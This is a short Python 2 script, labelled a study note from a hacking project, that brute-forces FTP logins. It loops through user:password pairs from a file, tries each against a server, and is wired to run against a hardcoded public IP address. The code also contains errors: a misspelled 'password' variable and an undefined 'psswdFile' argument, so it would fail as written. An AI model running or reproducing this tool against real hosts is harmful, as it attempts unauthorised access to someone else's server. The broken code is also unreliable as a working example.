# this file is the studying note of Learnbgame/hack
#
#

import ftplib

def bruteLogin(hostname,passwdFile):
    pF = open(passwdFile,'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + userName + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print('\n[*] ' + str(hostname) +' FTP Login Succeeded: ' + userName + "/" + passWord)
            ftp.quit()
            return (userName,passWord)
        except Exception,e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None,None)

host = '218.198.196.138'
passwdFile = 'userpass.txt'
bruteLogin(host,psswdFile)




